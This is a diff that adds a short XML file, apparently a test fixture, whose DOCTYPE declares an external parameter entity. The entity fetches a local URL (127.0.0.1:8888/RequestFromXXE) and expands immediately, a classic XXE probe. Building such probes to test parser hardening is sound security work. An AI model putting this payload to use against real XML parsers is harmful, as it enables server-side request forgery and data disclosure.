@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE root [
+        <!ENTITY % romote SYSTEM "http://127.0.0.1:8888/RequestFromXXE"> %romote;]>
+<root/>
